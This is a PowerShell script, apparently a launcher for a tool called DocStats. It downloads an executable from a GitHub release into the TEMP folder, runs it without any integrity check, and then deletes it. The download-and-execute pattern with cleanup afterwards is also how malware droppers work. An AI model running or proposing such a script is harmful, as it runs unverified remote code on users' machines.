$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = "https://github.com/Cereres097/MMprogs/releases/download/DocStats/DocStats.exe"
$localPath = Join-Path $env:TEMP "DocStats.exe"

try {
    if (Test-Path $localPath) {
        Remove-Item $localPath -Force -ErrorAction SilentlyContinue
    }

    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $localPath)

    if (-not (Test-Path $localPath)) {
        throw "Файл не скачался."
    }

    Start-Process -FilePath $localPath -Wait
}
catch {
    Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    if (Test-Path $localPath) {
        Remove-Item $localPath -Force -ErrorAction SilentlyContinue
    }
}
